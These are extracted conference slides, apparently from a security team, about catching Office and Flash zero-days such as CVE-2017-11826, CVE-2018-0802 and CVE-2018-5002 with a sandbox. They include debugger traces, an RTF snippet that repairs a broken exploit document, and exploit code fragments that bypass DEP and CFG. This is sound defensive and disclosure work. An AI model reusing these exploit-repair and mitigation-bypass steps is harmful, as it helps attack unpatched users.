April 2017
â€¢ CVE-2017-0261 (0day)
â€¢ CVE-2017-0262 (0day) + CVE-2017-0263 (0day)
â€¢ Reflection
â€¢ Sandbox Detection Engine is defective â˜¹
â€¢ CVE-2017-0261 sample cannot be triggered in Office 2010 â˜¹
â€¢ CVE-2017-0262 sample cannot be triggered in Office 2007 â˜¹
â€¢ When the user-mode engine meets a kernel zero-day â˜¹
August 2017
â€¢ CVE-2017-8759 (0day)
â€¢ Reflection
â€¢ The sandbox ran out of the sample, but failed to notify the analyst in time â˜¹
October 2017
â€¢ CVE-2017-11292 (1day) 
â€¢ Reflection
â€¢ Lack of understanding of the DealersChoice framework â˜¹
â€¢ If the target is a low version of Flash, issue CVE-2015-7645 â˜¹
â€¢ If the target is a high version of Flash, issue CVE-2017-11292 ğŸ˜€
Research Attack Framework
â€¢ DealersChoice
â€¢ Named by @Unit42_Intel
â€¢ Used by APT28
â€¢ Continuous improvement to avoid detection as much as possible
â€¢ Initial Approach
â€¢ Check current Flash version
â€¢ Filter geographical location
â€¢ Short survival time
â€¢ New Approach
â€¢ Anti-sandbox: need to simulate document slide
â€¢ Rewrite open source code, add malicious features, avoid static detection
Continue to Innovate
â€¢ Sandbox Detection Engine defects â˜¹
â€¢ Develop the next generation of sandbox 
detection engine ğŸ˜€
â€¢ Correctly environment is not selected â˜¹
â€¢ Make a variety of environments ğŸ˜€
â€¢ Make delivery strategies with high trigger 
rate ğŸ˜€
â€¢ Failure to notify analysts in a timely 
manner â˜¹
â€¢ Build a real-time notification system ğŸ˜€
â€¢ Not familiar enough with the attack 
framework â˜¹
â€¢ Research DealersChoice framework ğŸ˜€
â€¢ Enhance Flash specific detection ğŸ˜€
From 0 to 1
CVE-2017-11826
From 0 to 1
â€¢ September 27, 2017
From 0 to 1
â€¢ For the first time Chinese security company caught an in-the-wild Office zero-day
CVE-2017-11826
â€¢ OLEObject & Font object type obfuscation + ActiveX heap spray
; Normal execution under Office 2007
; mov
eax, [eax+44h]
0:000> dc 38450f4 l4c/4
038450f4
0000ffff 0000ffff 00000004 00000004
................
03845104
00000001 00000000 00000000 00000000
................
03845114
00000000 ffffffff ffffffff 00000000
................
03845124
00000000 ffffffff 00000000 00000000
................
03845134
00000000 01d9ffa0 67a02e58
........X..g
; mov
eax, [eax+44h]
0:000> dc 01d9ffa0 l4c/4
01d9ffa0
00000001 00000001 01f47928 00000009
........(y......
01d9ffb0
00000000 00000000 00000000 00000000
................
01d9ffc0
00000000 000004b0 00000000 00000000
................
01d9ffd0
0005003c 00000000 00000000 00000000
 dd 01f7e0a0 l1
01f7e0a0
65d9420c
; call
dword ptr [ecx+4]
0:000> dds 65d9420c l2
65d9420c
65b527ad mso!Ordinal1072+0x2dd
65d94210
658bbe71 mso!Ordinal836+0xaf
// AddRef
; Vuln triggered under Office 2007
; mov
eax, [eax+44h]
0:000> dc 5998140 l4c/4
05998140
000001de 000000dd 00000015 00000010
................
05998150
00000000 00000000 00000000 00000000
................
05998160
00000000 ffffffff ffffffff 00000000
................
05998170
00000000 ffffffff 00000000 00000000
................
05998180
00000000 04131700 67110a89
...........g
; mov
eax, [eax+44h]
0:000> dc 04131700 l4c/4
04131700
0000045f 00000000 00000000 00000000
_...............
04131710
00000000 00000000 00000000 00000000
................
04131720
00000000 00000000 0069004c 0063006e
........L.i.n.c.
04131730
00720065 00680043 00720061 00680043
e.r.C.h.a.r.C.h.
04131740
00720061 088888ec 006f0066
a.r.....f.o.
; mov
ecx, [eax]
0:000> dd 088888ec l1
088888ec
088883ec
; call
dword ptr [ecx+4]
0:000> dds 088883ec l2
088883ec
72980e2b MSVBVM60!IID_IVbaHost+0x127eb
088883f0
72980e2b MSVBVM60!IID_IVbaHost+0x127eb // Stack Pivot
From 1 to N
CVE-2018-0802
CVE-2018-8174
CVE-2018-5002
CVE-2018-15982
CVE-2018-0802
â€¢ Stack Overflow in Equation Editor
â€¢ December 14, 2017
â€¢ Embedding two vulnerabilities
â€¢ CVE-2017-11882
â€¢ CVE-2018-0802
â€¢ Can be triggered and exploited successfully ğŸ˜€
â€¢ December 19, 2017
â€¢ Embedding only one vulnerability
â€¢ CVE-2018-0802
â€¢ Cannot trigger properly â˜¹
â€¢ Can be successfully used after reconstructing OLE ğŸ˜€
CVE-2018-0802
â€¢ Both samples were reported to Microsoft
â€¢ On January 10, 2018, Microsoft acknowledged us
CVE-2018-0802
â€¢ Sample of December 19, 2017
â€¢ MD5: 299D0C5F43E59FC9415D70816AEE56C6
â€¢ Embedded 0day ğŸ˜€
â€¢ RTF obfuscation ğŸ˜€
â€¢ OLE data construct error â˜¹
Wrong equation flow ï¼š
DirEntry SID=4: 
'\xe7\x90\x80\xe6\xa4\x80\xe7\x98\x80\xe6\x94\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe2\
x80\x80\xc8\x80\xef\xbc\x80\xef\xbf\xbf\xef\xbf\xbf\xef\xbf\xbf\xef\xbf\xbf\xef\xbf\xbf\xc3\xbf\x00'
- type: 0
- sect: 0
- SID left: 0, right: 0, child: 0
- size: 0 (sizeLow=0, sizeHigh=0) # logged by olefile.py
Normal equation flow ï¼š
DirEntry SID=4: 'Equation Native'
- type: 2
- sect: 4
- SID left: 4294967295, right: 4294967295, child: 4294967295
- size: 197 (sizeLow=197, sizeHigh=0) # logged by olefile.py
CVE-2018-0802
â€¢ Where is the error?
â€¢ Extract the confusing OLE object
0:010> bp ole32!OleConvertOLESTREAMToIStorage
0:010> g
Breakpoint 0 hit
eax=000004e0 ebx=059bc3c0 ecx=00008000 edx=00000000 esi=02d80960 edi=001dade8
eip=75c528fa esp=001dab2c ebp=001dadb0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206
ole32!OleConvertOLESTREAMToIStorage:
75c528fa 8bff            mov     edi,edi
0:000> .writemem C:\de-obfuscated_ole.bin poi(poi(poi(esp + 0x04) + 0x08)) Lpoi(poi(esp + 0x04) + 0x0C)
Writing dc5 bytes..
0:000> db poi(poi(poi(esp + 0x04) + 0x08))
04946510  01 05 00 00 02 00 00 00-0b 00 00 00 45 71 75 61  ............Equa
04946520  74 69 6f 6e 2e 33 00 00-00 00 00 00 00 00 00 00  tion.3..........
04946530  0e 00 00 d0 cf 11 e0 a1-b1 1a e1 00 00 00 00 00  ................
04946540  00 00 00 00 00 00 00 00-00 00 00 3e 00 03 00 fe
...........>....
04946550  ff 09 00 06 00 00 00 00-00 00 00 00 00 00 00 01  ................
04946560  00 00 00 01 00 00 00 00-00 00 00 00 10 00 00 02  ................
04946570  00 00 00 01 00 00 00 fe-ff ff ff 00 00 00 00 00  ................
04946580  00 00 00 ff ff ff ff ff-ff ff ff ff ff ff ff ff
................
CVE-2018-0802
â€¢ Where is the error?
â€¢ MiniFat Sector misaligned 0x15 bytes
CVE-2018-0802
â€¢ How to "fix"?
â€¢ Make minor modifications to the original RTF document ğŸ˜€
{\object\objemb\objupdate{\*\objclass Equation.3}\objw380\objh260{\*\objdata 01050000{{\object}}
02000000
0b000000
4571756174696f6e2e3300
00000000
00000000
000e0000 ; Data Size
d0cf11e0a1b11ae1000000000000000000000000000000003e000300feff090006000000000000
...
000000000000000000000000000000000000000000feffffff02000000 ; Fill 0 forty-two times before MiniFat Sector
...
{\oldff}0a00ffffffff0100000000001c000000fb021000070000000000bc02000000000102022253797374656d000048008a0100000a0006000
0004800{\ole}8a01ffffffff7cef1800040000002d01010004000000f00100000300000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 ; Make up 
the length to satisfy Data Size
...
0105000000000000 ; extra Presentation data
CVE-2018-0802
â€¢ After the New Year's Day in 2018, more CVE-2018-0802 samples appeared
â€¢ Other researchers noticed the samples but didn't know they used a zero-day â˜¹
How to Distinguish Two Vulnerabilities
IPersistStorage::Load(406881)
offset:406a93     call ReadMTEFData(42f8ff)
offset:42f921     call 43755c
offset:4375d5    call 43a720
offset:43a72a    call 43a87a
offset:43a89b    call 43b418
; Font tag parse Logic
offset:43b44b    call ReadFontName(4164fa)
offset:43b461    call 4214c6
offset:4214dd    call LogfontStruct_Overflow(421774)
offset:4217c3    call 421e39 
offset:421e5e    rep movsd  overlength array -> arbitrary address read and write
// before mem = Value
0:005> dd 022cb91c l4
022cb91c  00000008 00000000 04730834 00000000
0:005> dd 04730834 l6
04730834  08800001 00000001 00000000 00000000
04730844  7fffffff 00000000
// after mem = Value
0:007> dd 022cb91c l4
022cb91c  0000200c 00000000 04730834 00000000
0:007> dd 04730834 l6
04730834  08800001 00000001 00000000 00000000
04730844  7fffffff 00000000
Class class_setprop_a
Dim mem
Function P
End Function
Function SetProp(Value)
mem = Value 'callback
SetProp = 0
End Function
End Class
CVE-2018-5002
â€¢ June 1, 2018
â€¢ A complex Flash control framework
â€¢ AVM2 Interpreter Vulnerability
CVE-2018-5002
â€¢ On June 7, 2018, Adobe acknowledged us
CVE-2018-5002
â€¢ Bypass ROP detection ğŸ˜€
â€¢ Override return address to bypass CFG ğŸ˜€
â€¢ Unable to bypass EAF detection â˜¹
var cls25:class_25 = new class_25(cls8, RtlUnwind_Addr);
var NtProtectVirtualMemory_Addr:uint = cls25.GetFuncAddrByEAT("NtProtectVirtualMemory");
if(0 == NtProtectVirtualMemory_Addr)
{
return new Array();
}
var NtPrivilegedServiceAuditAlarm_Addr:uint = cls25.GetFuncAddrByEAT("NtPrivilegedServiceAuditAlarm");
if(0 == NtPrivilegedServiceAuditAlarm_Addr)
{
return new Array();
}
How to Debug CVE-2018-5002
â€¢ Reverse -> ASC2.0 Compile -> Modify bytecode with FFDEC -> Debuggable swf file
â€¢ Open source WinDBG plugin
â€¢ https://github.com/michaelpdu/flashext_pykd
â€¢ Add 3 lines of code to make the plugin more perfect ğŸ˜€
def callback_after_call_getmethodname(self):
# dprintln("Enter into callback_after_call_getmethodname")
reg_eax = reg("eax")
# dprintln("EAX = " + hex(reg_eax))
addr_name = ptrPtr(reg_eax + 0x08)
len_name = ptrPtr(reg_eax + 0x10)
if 0 == addr_name and 0 != len_name:
if ptrPtr(reg_eax + 0x0C) != 0:
addr_name = ptrPtr(ptrPtr(reg_eax + 0x0C) + 0x08)
CVE-2018-5002 in the Debugger
// Before triggering
0:007> dd 02c0ab24-10
02c0ab14  093101f0 093101a0 093101f0 093101a0
02c0ab24  093101f0 093101a0 093101f0 093101a0
02c0ab34  093101f0 093101a0 093101f0 093101a0
02c0ab44  093101f0 093101a0 093101f0 093101a0
02c0ab54  093101f0 093101a0 093101f0 093101a0
02c0ab64  093101f0 093101a0 093101f0 093101a0
02c0ab74  093101f0 093101a0 093101f0 093101a0
02c0ab84  093101f0 093101a0 093101f0 093101a0
// After triggering
0:007> dd 02c0ab24-10
02c0ab14  093101f0 093101a0 093101f0 093101f0
02c0ab24  093101a0 093101a0 093101f0 093101a0
02c0ab34  093101f0 093101a0 093101f0 093101a0
02c0ab44  093101f0 093101a0 093101f0 093101a0
02c0ab54  093101f0 093101a0 093101f0 093101a0
02c0ab64  093101f0 093101a0 093101f0 093101a0
02c0ab74  093101f0 093101a0 093101f0 093101a0
02c0ab84  093101f0 093101a0 093101f0 093101a0
â€¢ Trigger Vulnerability -> Swap Pointer on stack -> Type Confusion
CVE-2018-15982
â€¢ November 29, 2018
â€¢ 2 hours, 2 samples
â€¢ UAF Vulnerability in TVSDK
CVE-2018-15982
â€¢ On December 5, 2018, Adobe acknowledged us again
CVE-2018-15982
â€¢ Use HackingTeam's trick to bypass ROP detection ğŸ˜€
â€¢ Unable to evade EAF detection â˜¹
// Virt(ualPro)tect = 74726956 74636574
var vp_addr:uint = this.getFuncAddrByEAT32(0x74726956, 0x74636574, 10, kernel32_addr);
...
this.writeDWORD32(sc_addr + 8 + 0x80 + 0x1c, vp_addr);
this.writeDWORD32(ptbl, sc_addr + 8 + 0x80);
this.writeDWORD32(p + 0x1c, sc_addr);
this.writeDWORD32(p + 0x20, vec_uint.length * 4);
var args:Array = new Array(0x41);
Payload.call.apply(null, args); // Call VirtualProtect to bypass DEP
Other Harvest
â€¢ 1 Word CVE ğŸ˜€
â€¢ 1 PowerPoint CVE ğŸ˜€
â€¢ 4 Excel CVE ğŸ˜€
â€¢ 1 Win32k CVE ğŸ˜€
Summary
â€¢ Easy from 1 to N, hard from 0 to 1
â€¢ Know your opponent, reflect 
upon yourself, beat your opponent
â€¢ Always on the road
Acknowledgement
â€¢ Thanks to all the partners of 360 Advanced Threat Team
â€¢ Thanks to @programmeboy, @guhe120, @binjo, @Unit42_Intel
â€¢ Special thanks to @HaifeiLi and his sharing about Office security
Needle in A Haystack: Catch Multiple Zero-days Using Sandbox
Qi Li
PI:EMAIL
@leeqwind
Quan Jin
PI:EMAIL
@jq0904